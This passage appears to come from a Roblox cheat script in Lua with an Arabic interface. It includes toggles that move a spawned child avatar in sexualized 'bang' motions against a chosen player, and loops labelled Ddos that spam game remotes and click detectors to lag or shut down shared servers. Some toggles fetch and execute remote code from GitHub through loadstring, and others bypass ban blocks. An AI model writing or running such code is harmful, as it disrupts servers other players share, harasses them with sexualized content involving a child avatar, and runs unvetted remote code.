                        and humanoidRootPart then

                        followCharacter.Torso.BodyPosition.Position =
                            humanoidRootPart.Position - (humanoidRootPart.CFrame.LookVector * 3)

                        followCharacter.Torso.BodyGyro.CFrame = humanoidRootPart.CFrame
                    end
                end)
            end

        else
            if getgenv().RunService then
                getgenv().RunService:Disconnect()
                getgenv().RunService = nil
            end

             args = {
                "SpawnChild",
                "BabyBoy"
            }

             re = ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Bab1yFollo1w")
            re:FireServer(unpack(args))

        end
    end
})
getgenv().BangSpeed = 1
ChildTab:AddSlider({
    Name = "سرعة البانق",
    MinValue = 0.1,
    MaxValue = 2,
    Default = getgenv().BangSpeed,
    Increase = 0.1,
    Callback = function(v)
        getgenv().BangSpeed = v
    end
})
function BangChild1()
     bangActive = false
    local connection
    togglePosition = false
    ChildTab:AddToggle({
        Name = "بانق الطفل 1",
        Default = false,
        Callback = function(Value)
            bangActive = Value

            plr = Players.LocalPlayer
            char = plr.Character
            if not char then return end

            model = workspace:FindFirstChild(plr.Name)

            if Value then
                if not model or not model:FindFirstChild("FollowCharacter") then
                     args = { "CharacterFollowSpawnPlayer", "BabyBoy" }
                    re = ReplicatedStorage:FindFirstChild("RE")
                    if re and re:FindFirstChild("1Bab1yFollo1w") then
                        re:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args))
                    else
                        return
                    end
                end

                model = workspace:WaitForChild(plr.Name, 5)
                if not model then return end

                baby = model:WaitForChild("FollowCharacter", 5)
                if not baby then return end

                if connection then connection:Disconnect() end

                connection = RunService.Heartbeat:Connect(function()
                    if bangActive and getgenv().Selec7tedPlayerNOme then
                        targetPlayer = Players:FindFirstChild(getgenv().Selec7tedPlayerNOme)
                        if targetPlayer and targetPlayer.Character and targetPlayer.Character.PrimaryPart then
                            head = targetPlayer.Character:FindFirstChild("Head")
                            if head then
                                offset = togglePosition and 1 or 4
                                baby:SetPrimaryPartCFrame(
                                    head.CFrame * CFrame.new(0, -1, offset)
                                )
                                togglePosition = not togglePosition
                                task.wait(getgenv().BangSpeed)
                            end
                        end
                    end
                end)

            else
                if connection then connection:Disconnect() end
                connection = nil
            end
        end
    })
end
BangChild1()

function FaceBang1()
    bangActive = false
    local connection
    togglePosition = false

    ChildTab:AddToggle({
        Name = "بانق وجه الطفل 1",
        Default = false,
        Callback = function(Value)
            bangActive = Value

            plr = Players.LocalPlayer
            char = plr.Character
            if not char then return end

            model = workspace:FindFirstChild(plr.Name)

            if Value then
                if not model or not model:FindFirstChild("FollowCharacter") then
                     args = { "CharacterFollowSpawnPlayer", "BabyBoy" }
                     re = ReplicatedStorage:FindFirstChild("RE")
                    if re and re:FindFirstChild("1Bab1yFollo1w") then
                        re:FindFirstChild("1Bab1yFollo1w"):FireServer(unpack(args))
                    else
                        return
                    end
                end

                model = workspace:WaitForChild(plr.Name, 5)
                if not model then return end

                 baby = model:WaitForChild("FollowCharacter", 5)
                if not baby then return end

                if connection then connection:Disconnect() end

                connection = RunService.Heartbeat:Connect(function()
                    if bangActive and getgenv().Selec7tedPlayerNOme then
                        targetPlayer = Players:FindFirstChild(getgenv().Selec7tedPlayerNOme)
                        if targetPlayer and targetPlayer.Character and targetPlayer.Character.PrimaryPart then
                            head = targetPlayer.Character:FindFirstChild("Head")
                            if head then
                                 offset = togglePosition and 1 or 4
                                baby:SetPrimaryPartCFrame(
                                    head.CFrame
                                    * CFrame.new(0, 1, -offset)
                                    * CFrame.Angles(0, math.rad(180), 0)
                                )
                                togglePosition = not togglePosition
                                task.wait(getgenv().BangSpeed)
                            end
                        end
                    end
                end)

            else
                if connection then connection:Disconnect() end
                connection = nil
            end
        end
    })
end
FaceBang1() 
Tablag = Window:MakeTab({ 
Title = "لاق السيرفر", 
Icon = "rbxassetid://10723415903" })
Tablag:AddSection({
    Name = "ايقاف السيرفر"
})

Tablag:AddToggle({
  Name = "ايقاف الانترنت والوقت سريع جدا!",
  Callback = function(Ddos)
if Ddos then
    local fireXPath = workspace.WorkspaceCom["001_DayCare"].Tools.FireX

    tools = "FireX"
    lagserver = true

    if workspace:FindFirstChild("Camera") then
        workspace:FindFirstChild("Camera"):Destroy()
    end

    wait(0.1)

    if workspace:FindFirstChild("Camera") then
        workspace:FindFirstChild("Camera"):Destroy()
    end

    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
        fireXPath.CFrame + Vector3.new(0,-15,0)

    task.wait(0.2)

    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
    ddos = true

    for i=1,700 do
        task.wait()

        if ddos == false then
            local args = {
                [1] = "ClearAllTools"
            }

            cleartoolremote:FireServer(unpack(args))
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9999,-475,9999)
            return
        end

        if workspace:FindFirstChild("Camera") then
            workspace:FindFirstChild("Camera"):Destroy()
        end

        if game.Players.LocalPlayer.Character:FindFirstChild(tools) then
            game.Players.LocalPlayer.Character:FindFirstChild(tools):Destroy()
        end

        if ddos == false then
            return
        end

        fireclickdetector(workspace.WorkspaceCom["001_DayCare"].Tools.FireX.ClickDetector,0)
    end

    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,-475,0)
    else
    ddos = false
    lagserver = false
    shutdownserver = false
end
  end
})

Tablag:AddToggle({
  Name = "اغلاق واطفاء السيرفر",
  Callback = function(state)
if state then
    local fireXPath = workspace.WorkspaceCom["001_DayCare"].Tools.FireX

    tools = "Iphone"
    lagserver = true

    if workspace:FindFirstChild("Camera") then
        workspace:FindFirstChild("Camera"):Destroy()
    end

    wait(0.1)

    if workspace:FindFirstChild("Camera") then
        workspace:FindFirstChild("Camera"):Destroy()
    end

    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
        fireXPath.CFrame + Vector3.new(0,-15,0)

    task.wait(0.2)

    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
    ddos = true

    for i=1,700 do
        task.wait()

        if ddos == false then
            local args = {
                [1] = "ClearAllTools"
            }

            cleartoolremote:FireServer(unpack(args))
            game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9999,-475,9999)
            return
        end

        if workspace:FindFirstChild("Camera") then
            workspace:FindFirstChild("Camera"):Destroy()
        end

        if game.Players.LocalPlayer.Character:FindFirstChild(tools) then
            game.Players.LocalPlayer.Character:FindFirstChild(tools):Destroy()
        end

        if ddos == false then
            return
        end

        fireclickdetector(workspace.WorkspaceCom["001_DayCare"].Tools.FireX.ClickDetector,0)
    end

    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,-475,0)
 
    else ddos = false
    lagserver = false
    shutdownserver = false 
end
  end
})
Tablag:AddSection({
    Name = "لاق باص"
})
 runLag = false
local lagCoroutine
Tablag:AddToggle({
    Name = "لاق باص(الافضل)",
    Default = false,
    Callback = function(Value)
        runLag = Value

        if runLag then
             Players = game:GetService("Players")  
             ReplicatedStorage = game:GetService("ReplicatedStorage")  
             LocalPlayer = Players.LocalPlayer  

            if not LocalPlayer then  
                warn("LocalPlayer não encontrado.")  
                return  
            end  

             character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()  
             humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)  
            if not humanoidRootPart then  
                warn("HumanoidRootPart não encontrado.")  
                return  
            end  

             function GetBus()  
                 vehicles = workspace:FindFirstChild("Vehicles")  
                if vehicles then  
                    return vehicles:FindFirstChild(LocalPlayer.Name .. "Car")  
                end  
                return nil  
            end  

             remoteEvent = ReplicatedStorage:FindFirstChild("RE")  
            if not remoteEvent then  
                warn("RemoteEvent 'RE' não encontrado em ReplicatedStorage.")  
                return  
            end  

            if not remoteEvent:FindFirstChild("1Ca1r") then  
                warn("Evento filho '1Ca1r' não encontrado dentro de 'RE'.")  
                return  
            end  

            lagCoroutine = coroutine.wrap(function()  
                while runLag do  
                    local success, err = pcall(function()  
                        humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)  
                         bus = GetBus()  
                        remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")  
                    end)  

                    if not success then  
                        warn("Erro ao executar lag loop: " .. tostring(err))  
                        runLag = false  
                        break  
                    end  

                    task.wait(0)
                end  
            end)  
            lagCoroutine()
        end
    end
})

LagToggles = { Phone = false, Bomb = false }

function clickNormally(object)
    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")
    if clickDetector then
        pcall(fireclickdetector, clickDetector)
    end
end
Tablag:AddSection({
    Name = "لاق لابتوب+لاق هاتف"
})
Tablag:AddToggle({
    Name = "لاق بالهاتف(V2)",
    Default = false,
    Callback = function(state)
        LagToggles.Phone = state

        if not state then return end

        local phonePath =
            workspace:FindFirstChild("WorkspaceCom")
            and workspace.WorkspaceCom:FindFirstChild("001_CommercialStores")
            and workspace.WorkspaceCom["001_CommercialStores"]:FindFirstChild("CommercialStorage1")
            and workspace.WorkspaceCom["001_CommercialStores"].CommercialStorage1:FindFirstChild("Store")
            and workspace.WorkspaceCom["001_CommercialStores"].CommercialStorage1.Store:FindFirstChild("Tools")
            and workspace.WorkspaceCom["001_CommercialStores"].CommercialStorage1.Store.Tools:FindFirstChild("Iphone")
        if not phonePath then
            local buyButton =
                workspace.WorkspaceCom["001_CommercialStores"]
                .CommercialPlot1Buttons
                .Commercial1Store1

            if buyButton then
                clickNormally(buyButton)
                task.wait(0.2)
            end
        end

        task.spawn(function()
            local player = game.Players.LocalPlayer

            while LagToggles.Phone do
                local char = player.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")

                if not root then
                    task.wait()
                    continue
                end
                if not phonePath or not phonePath.Parent then
                    phonePath =
                        workspace.WorkspaceCom["001_CommercialStores"]
                        .CommercialStorage1.Store.Tools:FindFirstChild("Iphone")
                end

                if phonePath then
                    root.CFrame = phonePath.CFrame

                    for i = 1, 6 do
                        clickNormally(phonePath)
                    end
                end

                task.wait(0.05)
            end
        end)
    end
})
local LaptopLoop = false
Tablag:AddToggle({
    Name = "لاق باللابتوب",
    Default = false,
    Callback = function(state)
        LaptopLoop = state
        if not state then return end

         player = game.Players.LocalPlayer

        task.spawn(function()
            while LaptopLoop do
                 char = player.Character
                 root = char and char:FindFirstChild("HumanoidRootPart")
                if not root then
                    task.wait()
                    continue
                end

                 laptop =
                    workspace.WorkspaceCom["001_CommercialStores"]
                    .CommercialStorage1.Store.Tools.Laptop

             clickDetector = laptop and laptop:FindFirstChild("ClickDetector")

                if laptop and clickDetector then
                    root.CFrame = laptop.CFrame
                    fireclickdetector(clickDetector)
                end

                task.wait(0.05)
            end
        end)
    end
})
Tablag:AddButton({
    Name = "تفعيل متجر الهواتف",
    Callback = function()
         Players = game:GetService("Players")
         Workspace = game:GetService("Workspace")
         player = Players.LocalPlayer


         char = player.Character or player.CharacterAdded:Wait()
         root = char:WaitForChild("HumanoidRootPart")

        root.CFrame = CFrame.new(-130.48, 20.84, 237.21)
        task.wait(0.2)
        local button = Workspace:FindFirstChild("WorkspaceCom")
        if button then
            button = button:FindFirstChild("001_CommercialStores")
            if button then
                button = button:FindFirstChild("CommercialPlot1Buttons")
                if button then
                    button = button:FindFirstChild("Commercial1Store1")
                    if button then
                         clickDet = button:FindFirstChildOfClass("ClickDetector")
                        if clickDet then
                            fireclickdetector(clickDet)
                        end
                    end
                end
            end
        end
    end
})
Tablag:AddParagraph({
    Title = "ملاحظة",
    Text = "انتظر 20 ثانية لظهور تأثير اللاق"
})
Tablag:AddSection("لاق قنابل")
Tablag:AddToggle({
    Name = "لاق قنابل",
    Default = false,
    Callback = function(state)
        LagToggles.Bomb = state
        if state then
             Player = game.Players.LocalPlayer
             Character = Player.Character or Player.CharacterAdded:Wait()
             RootPart = Character:WaitForChild("HumanoidRootPart")
             ReplicatedStorage = game:GetService("ReplicatedStorage")

             Bomb = workspace:FindFirstChild("WorkspaceCom")
                and workspace.WorkspaceCom:FindFirstChild("001_CriminalWeapons")
                and workspace.WorkspaceCom["001_CriminalWeapons"]:FindFirstChild("GiveTools")
                and workspace.WorkspaceCom["001_CriminalWeapons"].GiveTools:FindFirstChild("Bomb")

            if not Bomb or not Bomb:FindFirstChild("ClickDetector") then
                Tablag:AddNotification({
                    Name = "خطأ",
                    Content = "القنبلة غير موجودة!",
                    Time = 5
                })
                return
            end
            task.spawn(function()
                while LagToggles.Bomb and Bomb and RootPart do
                    pcall(function()
                        RootPart.CFrame = Bomb.CFrame
                        fireclickdetector(Bomb.ClickDetector)
                    end)
                    task.wait(0.0001)
                end
            end)

        
            task.spawn(function()
                while LagToggles.Bomb do
                    pcall(function()
                         VirtualInputManager = game:GetService("VirtualInputManager")
                        VirtualInputManager:SendMouseButtonEvent(500, 500, 0, true, game, 0)
                        task.wait(1.5)
                        VirtualInputManager:SendMouseButtonEvent(500, 500, 0, false, game, 0)

                         args = { [1] = "Bomb" .. Player.Name }
                         BombServer = ReplicatedStorage:FindFirstChild("RE"):FindFirstChild("1Blo1wBomb1sServe1r")
                        if BombServer then
                            BombServer:FireServer(unpack(args))
                        end
                    end)
                    task.wait(1.5)
                end
            end)
        end
    end
})
FireXLoop = false
Tablag:AddToggle({
    Name = "تجميع FireX",
    Default = false,
    Callback = function(state)
        FireXLoop = state
        if not state then return end

        task.spawn(function()
             Players = game:GetService("Players")
             player = Players.LocalPlayer

            while FireXLoop do   
                 char = player.Character or player.CharacterAdded:Wait()
                 root = char:FindFirstChild("HumanoidRootPart")
                if not root then
                    task.wait()
                    continue
                end           
                 fireXPath =
                    workspace.WorkspaceCom["001_DayCare"]
                    .Tools.FireX

                 clickDetector = fireXPath:FindFirstChild("ClickDetector")

                if fireXPath and clickDetector then
                
                    root.CFrame = fireXPath.CFrame
                    
                    fireclickdetector(clickDetector)
                end

                task.wait(0.01)
            end
        end)
    end
})
Tablag:AddParagraph({
    Title = "ملاحظة",
    Text = "انتظر 35 ثانية لظهور تأثير اللاق"
})
LagToggles = { Sniper = false }
Tablag:AddSection("لاق سنايبر")
Tablag:AddToggle({
    Name = "لاق سنايبر",
    Default = false,
    Callback = function(state)
        LagToggles.Sniper = state
        if state then
            Player = game.Players.LocalPlayer
            Character = Player.Character or Player.CharacterAdded:Wait()
            RootPart = Character:WaitForChild("HumanoidRootPart")
             ReplicatedStorage = game:GetService("ReplicatedStorage")

            Sniper =
                workspace:FindFirstChild("WorkspaceCom")
                and workspace.WorkspaceCom:FindFirstChild("001_CriminalWeapons")
                and workspace.WorkspaceCom["001_CriminalWeapons"]:FindFirstChild("GiveTools")
                and workspace.WorkspaceCom["001_CriminalWeapons"].GiveTools:FindFirstChild("Sniper")

            if not Sniper or not Sniper:FindFirstChild("ClickDetector") then
                Tablag:AddNotification({
                    Name = "خطأ",
                    Content = "السنايبر غير موجود!",
                    Time = 5
                })
                return
            end

            task.spawn(function()
                while LagToggles.Sniper and Sniper and RootPart do
                    pcall(function()
                        RootPart.CFrame = Sniper.CFrame
                        fireclickdetector(Sniper.ClickDetector)
                    end)
                    task.wait(0.0001)
                end
            end)


            task.spawn(function()
                while LagToggles.Sniper do
                    pcall(function()
                         VirtualInputManager = game:GetService("VirtualInputManager")
                        VirtualInputManager:SendMouseButtonEvent(500, 500, 0, true, game, 0)
                        task.wait(0.2)
                        VirtualInputManager:SendMouseButtonEvent(500, 500, 0, false, game, 0)

                         sniperRemote =
                            ReplicatedStorage:FindFirstChild("RE")
                            and ReplicatedStorage.RE:FindFirstChild("1Sn1pe1rServe1r")

                        if sniperRemote then
                            sniperRemote:FireServer(Player.Name)
                        end
                    end)
                    task.wait(0.3)
                end
            end)
        end
    end
})

local RedzTab = Window:MakeTab({
    Title = "(EXTRA)الحماية",
    Icon = "rbxassetid://10723415903"
})
RedzTab:AddToggle({
    Name = "مضاد موت(مدمر💀)",
    Default = false,
    Callback = function(state)
        if state then
            game.Workspace.FallenPartsDestroyHeight = 0/0
        else
            game.Workspace.FallenPartsDestroyHeight = -500
        end
    end
})
RedzTab:AddToggle({
  Name = "(V3)مضاد جلوس",
  Default = false,
    Callback = function(Value)
if Value then
loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom85"))()
else
loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom86"))()
end
    end
})
RedzTab:AddToggle({
    Name = "🚫مضاد باند(V2)",
    Default = false,
    Callback = function(enabled)
        OriginalBanned = {}

        if enabled then
            for _, desc in ipairs(workspace:GetDescendants()) do
                if desc.Name == "BannedBlock" and desc:IsA("BasePart") then
                    OriginalBanned[desc] = desc.Position
                    desc:Destroy()
                end
            end

            _G.AntiBannedConnection = workspace.DescendantAdded:Connect(function(desc)
                if desc.Name == "BannedBlock" and desc:IsA("BasePart") then
                    OriginalBanned[desc] = desc.Position
                    desc:Destroy()
                end
            end)
        else
            if _G.AntiBannedConnection then
                _G.AntiBannedConnection:Disconnect()
                _G.AntiBannedConnection = nil
            end

            for _, pos in pairs(OriginalBanned) do
                local newBlock = Instance.new("Part")
                newBlock.Name = "BannedBlock"
                newBlock.Size = Vector3.new(4,4,4)
                newBlock.Position = pos
                newBlock.Anchored = true
                newBlock.Parent = workspace
            end
        end
    end
})

_G.HideNukePlayers = false
_G.HiddenPlayers = {}

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local NUKE_ANIM = "rbxassetid://70883871260184"

local NUKE_BODY = {
	["96655874457685"] = true,
	["123402086843885"] = true,
	["78300682916056"] = true,
	["86276701020724"] = true,
	["78409653958165"] = true,
	["120668655481073"] = true
}


local function Notify(txt)
	pcall(function()
		StarterGui:SetCore("SendNotification",{
			Title = "مضاد الفلاش والسماء",
			Text = txt,
			Duration = 4
		})
	end)
end

local function CheckAndHidePlayer(plr)
	if not _G.HideNukePlayers then return end
	if _G.HiddenPlayers[plr] then return end

	local char = plr.Character
	if not char then return end

	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local found = false
	local tracks = hum:GetPlayingAnimationTracks()

	for _,tr in pairs(tracks) do
		if tr.Animation and tr.Animation.AnimationId == NUKE_ANIM then
			found = true
		end
	end

	local desc = hum:GetAppliedDescription()

	if desc then
		local ids = {
			desc.Torso,
			desc.RightArm,
			desc.LeftArm,
			desc.RightLeg,
			desc.LeftLeg,
			desc.Head
		}

		for _,id in pairs(ids) do
			if NUKE_BODY[tostring(id)] then
				found = true
			end
		end
	end

	if not found then return end

	local saved = {
		parts = {},
		tracks = {}
	}

	for _,obj in pairs(char:GetDescendants()) do
		if obj:IsA("BasePart") then
			table.insert(saved.parts,obj)
			obj.LocalTransparencyModifier = 1
		end
	end

	for _,tr in pairs(tracks) do
		if tr.Animation and tr.Animation.AnimationId == NUKE_ANIM then
			table.insert(saved.tracks,tr)
			tr:Stop()
		end
	end


	_G.HiddenPlayers[plr] = saved

	Notify("تم اخفاء سكاي اللاعب الكلب: "..plr.Name)
end

RedzTab:AddToggle({
	Name = "مضاد فلاش العمى او اختراق السماء",
	Default = false,
	Callback = function(v)

		_G.HideNukePlayers = v

		if v then

			for _,plr in ipairs(Players:GetPlayers()) do
				if plr ~= Players.LocalPlayer then

					task.spawn(function()
						repeat task.wait() until plr.Character
						task.wait(1)

						CheckAndHidePlayer(plr)
					end)

				end
			end

		else

			for _,data in pairs(_G.HiddenPlayers) do

				pcall(function()

					for _,p in pairs(data.parts) do
						p.LocalTransparencyModifier = 0
					end


					for _,t in pairs(data.tracks) do
						t:Play()
					end

				end)
			end


			_G.HiddenPlayers = {}

		end
	end
})

Players.PlayerAdded:Connect(function(plr)

	plr.CharacterAdded:Connect(function()

		task.wait(2)
		CheckAndHidePlayer(plr)

	end)

end)


for _,plr in ipairs(Players:GetPlayers()) do

	if plr ~= Players.LocalPlayer then

		plr.CharacterAdded:Connect(function()

			task.wait(2)
			CheckAndHidePlayer(plr)

		end)

	end

end

RedzTab:AddToggle({
    Name = "مضاد رحمة",
    Default = false,
    Callback = function(state)

        if state then
            game.Workspace.FallenPartsDestroyHeight = 0/0

            Players = game:GetService("Players")
            RunService = game:GetService("RunService")

            player = Players.LocalPlayer
            character = player.Character or player.CharacterAdded:Wait()
            humanoid = character:WaitForChild("Humanoid")
            root = character:WaitForChild("HumanoidRootPart")

            savedParts = {}

            for _,v in pairs(character:GetDescendants()) do
                if v:IsA("BasePart") and v.Transparency < 1 then
                    savedParts[#savedParts+1] = v
                end
            end

            for _,p in pairs(savedParts) do
                p.Transparency = 0.5
            end

            antibangConnection = RunService.Heartbeat:Connect(function()

                if root and humanoid then

                    oldCF = root.CFrame
                    oldOffset = humanoid.CameraOffset

                    fakeCF = oldCF * CFrame.new(0,-250000,0)
                    camFix = fakeCF:ToObjectSpace(CFrame.new(oldCF.Position)).Position

                    root.CFrame = fakeCF
                    humanoid.CameraOffset = camFix

                    RunService.RenderStepped:Wait()

                    root.CFrame = oldCF
                    humanoid.CameraOffset = oldOffset
                end

            end)

        else

            game.Workspace.FallenPartsDestroyHeight = -500

            if antibangConnection then
                antibangConnection:Disconnect()
            end

            if savedParts then
                for _,p in pairs(savedParts) do
                    if p then
                        p.Transparency = 0
                    end
                end
            end

        end

    end
})

RedzTab:AddToggle({
	Name = "مضاد قلتشات",
	Default = false,
	Callback = function(enabled)

		RunService = game:GetService("RunService")
		local AntiBugConn

		if _G.__AntiBugConn then
			_G.__AntiBugConn:Disconnect()
			_G.__AntiBugConn = nil
		end

		if enabled then
			_G.__AntiBugConn = RunService.Stepped:Connect(function()
				local cam = workspace.CurrentCamera
				if not cam then return end

				for _, obj in ipairs(cam:GetChildren()) do
					if obj:IsA("BasePart") and string.lower(obj.Name) == "water" then
						pcall(function()
							obj:Destroy()
						end)
					end
				end
			end)
		end

	end
})
RedzTab:AddToggle({
	Name = "مضاد فلنق",
	Default = false,
	Callback = function(value)

		Players = game:GetService("Players")
		Workspace = game:GetService("Workspace")

		LocalPlayer = Players.LocalPlayer


		 antiVehicleCollision = value
		keywords = { "bomb", "soccer", "boat" }
		carKeyword = "car"
		wheelKeyword = "wheel"


		function containsKeyword(name, list)
			if typeof(name) ~= "string" then return false end
			name = name:lower()
			for _, word in ipairs(list) do
				if name:find(word) then
					return true
				end
			end
			return false
		end

		function applyCollision(obj)
			if not obj:IsA("BasePart") then return end
			if obj.Name:lower():find(wheelKeyword) then return end

			parent = obj
			while parent do
				local pname = parent.Name:lower()

				if pname:find(wheelKeyword) then
					return
				end

				if pname:find(carKeyword) or containsKeyword(pname, keywords) then
					obj.CanCollide = not antiVehicleCollision
					return
				end

				parent = parent.Parent
			end
		end

		function scanAll()
			for _, obj in ipairs(Workspace:GetDescendants()) do
				applyCollision(obj)
			end
		end


		if _G.AntiVehicleConn then
			_G.AntiVehicleConn:Disconnect()
			_G.AntiVehicleConn = nil
		end


		scanAll()

		if value then
			_G.AntiVehicleConn = Workspace.DescendantAdded:Connect(function(obj)
				applyCollision(obj)
			end)
		end
	end
})
RedzTab:AddToggle({
    Name = "مضاد لاق ادوات",
    Description = "",
    Default = false,
    Callback = function(state)
        local Players = game:GetService("Players")
        local dedupLock = {}
        local IGNORED_PLAYER

        if not state then return end

        local function marcarIgnorado(player)
            IGNORED_PLAYER = player
        end

        local function isTargetTool(inst)
            return inst:IsA("Tool")
        end

        local function gatherTools(player)
            local found = {}
            local containers = {}
            if player.Character then table.insert(containers, player.Character) end
            local backpack = player:FindFirstChildOfClass("Backpack")
            if backpack then table.insert(containers, backpack) end
            local sg = player:FindFirstChild("StarterGear")
            if sg then table.insert(containers, sg) end
            for _, container in ipairs(containers) do
                for _, child in ipairs(container:GetChildren()) do
                    if isTargetTool(child) then table.insert(found, child) end
                end
            end
            return found
        end

        local function dedupePlayer(player)
            if player == IGNORED_PLAYER then return end
            if dedupLock[player] then return end
            dedupLock[player] = true
            local tools = gatherTools(player)
            if #tools > 1 then
                for i = 2, #tools do pcall(function() tools[i]:Destroy() end) end
            end
            dedupLock[player] = false
        end

        local function hookPlayer(player)
            if not IGNORED_PLAYER then marcarIgnorado(player) end
            task.defer(dedupePlayer, player)
            local function setupChar(char)
                task.delay(0.5, function() dedupePlayer(player) end)
                char.ChildAdded:Connect(function(child)
                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end
                end)
            end
            if player.Character then setupChar(player.Character) end
            player.CharacterAdded:Connect(setupChar)
            local backpack = player:WaitForChild("Backpack", 10)
            if backpack then
                backpack.ChildAdded:Connect(function(child)
                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end
                end)
            end
            local sg = player:FindFirstChild("StarterGear") or player:WaitForChild("StarterGear", 10)
            if sg then
                sg.ChildAdded:Connect(function(child)
                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end
                end)
            end
        end

        Players.PlayerAdded:Connect(hookPlayer)
        for _, plr in ipairs(Players:GetPlayers()) do hookPlayer(plr) end

        task.spawn(function()
            while state do
                for _, plr in ipairs(Players:GetPlayers()) do dedupePlayer(plr) end
                task.wait(2)
            end
        end)
    end
})
RedzTab:AddToggle({
    Name = "مضاد ابواب",
    Description = "",
    Default = false,
    Callback = function(state)
        if not _G.hiddenDoors then _G.hiddenDoors = {} end
        if state then
            _G.hiddenDoors = {}
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Name:lower():find("door") then
                    local doorData = {
                        door = obj,
                        originalTransparency = obj.Transparency,
                        originalCanCollide = obj.CanCollide,
                        originalCastShadow = obj.CastShadow
                    }
                    obj.Transparency = 1
                    obj.CanCollide = false
                    obj.CastShadow = false
                    for _, child in ipairs(obj:GetChildren()) do
                        if child:IsA("BasePart") then
                            child.Transparency = 1
                            child.CanCollide = false
                        elseif child:IsA("SurfaceGui") or child:IsA("BillboardGui") then
                            child.Enabled = false
                        end
                    end
                    table.insert(_G.hiddenDoors, doorData)
                end
            end
            print("DemoZ " .. #_G.hiddenDoors .. "   ")
        else
            for _, doorData in ipairs(_G.hiddenDoors or {}) do
                if doorData.door and doorData.door.Parent then
                    doorData.door.Transparency = doorData.originalTransparency
                    doorData.door.CanCollide = doorData.originalCanCollide
                    doorData.door.CastShadow = doorData.originalCastShadow
                    for _, child in ipairs(doorData.door:GetChildren()) do
                        if child:IsA("BasePart") then
                            child.Transparency = 0
                            child.CanCollide = true
                        elseif child:IsA("SurfaceGui") or child:IsA("BillboardGui") then
                            child.Enabled = true
                        end
                    end
                end
            end
            print(" " .. #(_G.hiddenDoors or {}) .. " ")
            _G.hiddenDoors = {}
        end
    end
})

args = {
	"PickingRPNameColor",
	Color3.new(1, 0, 0.02712726593017578)
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eColo1r"):FireServer(unpack(args))

args = {
	"PickingRPBioColor",
	Color3.new(1, 0, 0.02712726593017578)
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eColo1r"):FireServer(unpack(args))


args = {
	"RolePlayName",
	"V2"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
task.wait(3)
args = {
	"RolePlayBio",
	"..... "
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))


